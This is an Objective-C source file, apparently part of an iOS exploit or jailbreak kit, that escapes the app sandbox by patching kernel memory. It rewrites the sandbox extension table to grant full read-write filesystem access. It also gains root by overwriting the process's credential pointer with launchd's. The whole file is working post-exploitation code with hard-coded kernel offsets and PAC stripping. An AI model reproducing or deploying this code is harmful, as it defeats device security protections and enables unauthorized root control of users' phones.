/*
 * sandbox_escape.m — Sandbox escape via kernel memory patching
 *
 * Walk proc_ro → ucred → cr_label → sandbox → ext_set → ext_table
 * Patch extension paths to "/", rewrite class to "com.apple.app-sandbox.read-write"
 * Fill all 16 hash slots → full R+W filesystem access
 * Based on 18.3_sandbox/root.m by CrazyMind90.
 */

#import <Foundation/Foundation.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/stat.h>
#include "sandbox_escape.h"
#include "kexploit/kexploit_opa334.h"
#include "kexploit/krw.h"
#include "kexploit/kutils.h"
#include "kexploit/offsets.h"

extern void early_kread(uint64_t where, void *read_buf, size_t size);

#define KRW_LEN 0x20

// Verified offsets (IDA binary analysis across 6 kernelcaches)
#define OFF_PROC_PROC_RO       0x18  // proc → proc_ro (stable 17.0-26.x)
#define OFF_PROC_RO_UCRED      0x20  // proc_ro → p_ucred (verified all versions)
#define OFF_UCRED_CR_LABEL     0x78  // ucred → cr_label (KDK struct dump)
#define OFF_LABEL_SANDBOX      0x10  // label → sandbox (MAC l_perpolicy[1])
#define OFF_SANDBOX_EXT_SET    0x10  // sandbox → ext_set
#define OFF_EXT_DATA           0x40  // ext → data_addr
#define OFF_EXT_DATALEN        0x48  // ext → data_len

// posix_cred lives inside ucred at +0x18 (16B cr_link + 8B cr_ref).
// Derived from OFF_UCRED_CR_LABEL=0x78 and sizeof(posix_cred)=0x60.
#define OFF_UCRED_CR_POSIX     0x18
#define OFF_POSIX_CR_UID       0x00
#define OFF_POSIX_CR_RUID      0x04
#define OFF_POSIX_CR_SVUID     0x08
#define OFF_POSIX_CR_NGROUPS   0x0C
#define OFF_POSIX_CR_GROUPS_0  0x10  // first group (cr_groups[0])
#define OFF_POSIX_CR_RGID      0x50
#define OFF_POSIX_CR_SVGID     0x54
#define OFF_POSIX_CR_GMUID     0x58
#define OFF_POSIX_CR_FLAGS     0x5C

#ifdef __arm64e__
static uint64_t __attribute((naked)) __xpaci_sbx(uint64_t a) {
    asm(".long 0xDAC143E0");
    asm("ret");
}
#else
#define __xpaci_sbx(x) (x)
#endif

extern uint64_t VM_MIN_KERNEL_ADDRESS;
extern uint64_t pac_mask;

#define S(x) ({ uint64_t _v = __xpaci_sbx(x); \
    ((_v >> 32) > 0xFFFF ? (_v | pac_mask) : _v); })
#define K(x) ((x) > VM_MIN_KERNEL_ADDRESS)

static uint64_t read_proc_ro(uint64_t proc) {
    uint32_t proc_ro_off = off_proc_p_proc_ro ? off_proc_p_proc_ro : OFF_PROC_PROC_RO;
    return S(early_kread64(proc + proc_ro_off));
}

static bool validate_ucred(uint64_t ucred, uint64_t *label_out, uint64_t *sandbox_out) {
    if (!K(ucred)) return false;

    uint32_t label_off = off_ucred_cr_label ? off_ucred_cr_label : OFF_UCRED_CR_LABEL;
    uint32_t sandbox_off = off_label_l_perpolicy_sandbox ? off_label_l_perpolicy_sandbox : OFF_LABEL_SANDBOX;

    uint64_t label = S(early_kread64(ucred + label_off));
    if (!K(label)) return false;

    uint64_t sandbox = S(early_kread64(label + sandbox_off));
    if (!K(sandbox)) return false;

    if (label_out) *label_out = label;
    if (sandbox_out) *sandbox_out = sandbox;
    return true;
}

static uint64_t find_ucred_in_proc_ro(uint64_t proc_ro, uint64_t *label_out,
                                      uint64_t *sandbox_out, uint32_t *slot_out) {
    uint32_t preferred = off_proc_ro_p_ucred ? off_proc_ro_p_ucred : OFF_PROC_RO_UCRED;
    if (preferred) {
        uint64_t raw = early_kread64(proc_ro + preferred);
        uint64_t smr = kread_smrptr(proc_ro + preferred);
        uint64_t pac = S(raw);
        NSLog(@"[SBX] preferred ucred slot proc_ro+0x%x: raw=0x%llx smr=0x%llx pac=0x%llx",
              preferred, raw, smr, pac);

        if (validate_ucred(smr, label_out, sandbox_out)) {
            if (slot_out) *slot_out = preferred;
            return smr;
        }
        if (validate_ucred(pac, label_out, sandbox_out)) {
            if (slot_out) *slot_out = preferred;
            return pac;
        }
    }

    NSLog(@"[SBX] Scanning proc_ro for ucred fallback...");
    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
        if (off == preferred) continue;
        uint64_t raw = early_kread64(proc_ro + off);
        uint64_t smr = kread_smrptr(proc_ro + off);
        uint64_t pac = S(raw);
        NSLog(@"[SBX]   proc_ro+0x%x: raw=0x%llx smr=0x%llx pac=0x%llx",
              off, raw, smr, pac);

        if (validate_ucred(smr, label_out, sandbox_out)) {
            if (slot_out) *slot_out = off;
            return smr;
        }
        if (validate_ucred(pac, label_out, sandbox_out)) {
            if (slot_out) *slot_out = off;
            return pac;
        }
    }
    return 0;
}

#pragma mark - Extension patching

static void patch_ext(uint64_t ext) {
    uint64_t da = early_kread64(ext + OFF_EXT_DATA);
    uint64_t dl = early_kread64(ext + OFF_EXT_DATALEN);
    if (K(da) && dl > 0) {
        uint8_t buf[KRW_LEN];
        early_kread(da, buf, KRW_LEN);
        buf[0] = '/'; buf[1] = 0;
        early_kwrite32bytes(da, buf);
    }
    uint8_t chunk[KRW_LEN];
    early_kread(ext + OFF_EXT_DATA, chunk, KRW_LEN);
    *(uint64_t*)(chunk + 0x08) = 1;
    *(uint64_t*)(chunk + 0x10) = 0xFFFFFFFFFFFFFFFFULL;
    early_kwrite32bytes(ext + OFF_EXT_DATA, chunk);
}

static int patch_chain(uint64_t hdr) {
    int n = 0;
    for (int i = 0; i < 64 && K(hdr); i++) {
        uint64_t ext = S(early_kread64(hdr + 0x8));
        if (K(ext)) { patch_ext(ext); n++; }
        uint64_t next = early_kread64(hdr);
        if (!next || !K(next)) break;
        hdr = S(next);
    }
    return n;
}

static void set_rw_class(uint64_t hdr) {
    uint64_t ext = S(early_kread64(hdr + 0x8));
    if (!K(ext)) return;
    uint64_t da = early_kread64(ext + OFF_EXT_DATA);
    if (!K(da)) return;

    const char *rw = "com.apple.app-sandbox.read-write";
    uint8_t b1[KRW_LEN], b2[KRW_LEN];
    memset(b1, 0, KRW_LEN); memset(b2, 0, KRW_LEN);
    memcpy(b1, rw, KRW_LEN);
    early_kwrite32bytes(da + 32, b1);
    early_kwrite32bytes(da + 64, b2);

    uint8_t hb[KRW_LEN];
    early_kread(hdr, hb, KRW_LEN);
    *(uint64_t*)(hb + 0x10) = da + 32;
    early_kwrite32bytes(hdr, hb);
}

#pragma mark - Main entry

int sandbox_escape(uint64_t self_proc) {
    if (!self_proc) { NSLog(@"[SBX] self_proc is NULL"); return -1; }

    uint32_t proc_ro_off = off_proc_p_proc_ro ? off_proc_p_proc_ro : OFF_PROC_PROC_RO;
    uint64_t proc_ro_raw = early_kread64(self_proc + proc_ro_off);
    uint64_t proc_ro = S(proc_ro_raw);
    NSLog(@"[SBX] self_proc=0x%llx proc_ro_off=0x%x proc_ro_raw=0x%llx proc_ro=0x%llx",
          self_proc, proc_ro_off, proc_ro_raw, proc_ro);
    if (!K(proc_ro)) { NSLog(@"[SBX] proc_ro invalid"); return -1; }

    // Prefer Darksword's version/device offsets, then fall back to a bounded scan.
    uint64_t label = 0;
    uint64_t sandbox = 0;
    uint32_t ucred_slot = 0;
    uint64_t ucred = find_ucred_in_proc_ro(proc_ro, &label, &sandbox, &ucred_slot);
    if (!K(ucred)) { NSLog(@"[SBX] ucred not found in proc_ro"); return -1; }
    NSLog(@"[SBX] Found ucred at proc_ro+0x%x = 0x%llx", ucred_slot, ucred);

    uint64_t ext_set = S(early_kread64(sandbox + OFF_SANDBOX_EXT_SET));
    if (!K(ext_set)) { NSLog(@"[SBX] ext_set invalid"); return -1; }

    NSLog(@"[SBX] proc_ro=0x%llx ucred=0x%llx label=0x%llx sandbox=0x%llx ext_set=0x%llx",
          proc_ro, ucred, label, sandbox, ext_set);

    int patched = 0;
    for (int s = 0; s < 16; s++) {
        uint64_t hdr = S(early_kread64(ext_set + s * 8));
        if (K(hdr)) patched += patch_chain(hdr);
    }
    NSLog(@"[SBX] Patched %d extensions", patched);

    int classed = 0;
    for (int s = 0; s < 16; s++) {
        uint64_t hdr = S(early_kread64(ext_set + s * 8));
        if (K(hdr) && K(early_kread64(hdr + 0x10))) { set_rw_class(hdr); classed++; }
    }
    NSLog(@"[SBX] Changed %d extension classes", classed);

    uint64_t src = 0;
    for (int s = 0; s < 16 && !src; s++) {
        uint64_t h = S(early_kread64(ext_set + s * 8));
        if (K(h)) src = h;
    }
    if (src) {
        int filled = 0;
        for (int s = 0; s < 16; s++) {
            uint64_t h = early_kread64(ext_set + s * 8);
            if (!h || !K(h)) { early_kwrite64(ext_set + s * 8, src); filled++; }
        }
        NSLog(@"[SBX] Filled %d empty hash slots", filled);
    }

    int fd_w = open("/var/mobile/.sbx_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd_w >= 0) { close(fd_w); unlink("/var/mobile/.sbx_test"); }

    if (fd_w >= 0) {
        NSLog(@"[SBX] *** SANDBOX ESCAPED (R+W) ***");
        return 0;
    }

    NSLog(@"[SBX] Sandbox escape verification failed (errno=%d: %s)", errno, strerror(errno));
    return -1;
}

#pragma mark - UID elevation (uid=0 via launchd ucred swap)

// Resolve a valid ucred pointer using the same offset-aware path as sandbox_escape.
static int sbx_find_ucred_slot(uint64_t proc, uint64_t *ucred_out, uint32_t *off_out) {
    if (!proc) return -1;
    uint64_t proc_ro = read_proc_ro(proc);
    if (!K(proc_ro)) return -1;

    uint32_t slot = 0;
    uint64_t ucred = find_ucred_in_proc_ro(proc_ro, NULL, NULL, &slot);
    if (!K(ucred)) return -1;

    if (ucred_out) *ucred_out = ucred;
    if (off_out) *off_out = slot;
    return 0;
}

static uint64_t sbx_ucredbyproc(uint64_t proc) {
    uint64_t ucred = 0;
    uint32_t off = 0;
    if (sbx_find_ucred_slot(proc, &ucred, &off) != 0) return 0;
    return ucred;
}

int sandbox_elevate_to_root(uint64_t self_proc) {
    uint64_t launchd = proc_find_by_name("launchd");
    if (!launchd || launchd == (uint64_t)-1) {
        NSLog(@"[SBX] elevate: procbyname(\"launchd\") failed; trying pid 1 fallback");
        launchd = proc_find(1);
        if (launchd && launchd != (uint64_t)-1) {
            NSLog(@"[SBX] elevate: resolved launchd via pid 1 fallback: 0x%llx", launchd);
        }
    }
    if (!launchd || launchd == (uint64_t)-1) {
        NSLog(@"[SBX] elevate: could not find launchd");
        return -1;
    }

    uint64_t launchducred = sbx_ucredbyproc(launchd);
    if (!launchducred) {
        NSLog(@"[SBX] elevate: failed to get valid ucred from launchd");
        return -1;
    }
    NSLog(@"[SBX] elevate: launchd ucred: 0x%llx", launchducred);

    if (!self_proc) {
        NSLog(@"[SBX] elevate: failed to get our proc");
        return -1;
    }
    NSLog(@"[SBX] elevate: ourproc: 0x%llx", self_proc);

    uint64_t ourucredraw = early_kread64(self_proc + 0x10);
    uint64_t ourucred = S(ourucredraw);
    NSLog(@"[SBX] elevate: ourucred: 0x%llx", ourucred);

    early_kwrite64(self_proc + 0x10, launchducred);

    if (getuid() == 0) {
        NSLog(@"[SBX] elevate success!");
        return 0;
    }

    NSLog(@"[SBX] elevate failed, uid: %d", getuid());
    return -1;
}
